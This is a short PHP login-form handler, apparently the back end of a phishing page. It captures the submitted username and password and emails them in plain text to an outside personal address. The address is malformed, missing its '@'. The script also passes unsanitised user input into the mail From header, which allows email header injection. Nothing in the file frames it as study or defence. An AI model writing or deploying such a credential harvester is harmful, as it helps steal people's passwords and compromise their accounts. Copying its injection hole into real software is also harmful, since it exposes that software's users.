<?php
if (isset($_POST['submit'])) {
  // Collect form data
  $user = $_POST['user'];
  $password = $_POST['password'];

  // Set email variables
  $to = 'chulindrarai123gmail.com';
  $subject = 'Login Form Submission';
  $message = "User Name: $user\nPassword: $password";

  // Send email
  $headers = "From: $user\r\n";
  if (mail($to, $subject, $message, $headers)) {
    echo 'Email sent successfully!';
  } else {
    echo 'Failed to send email';
  }
}
?>
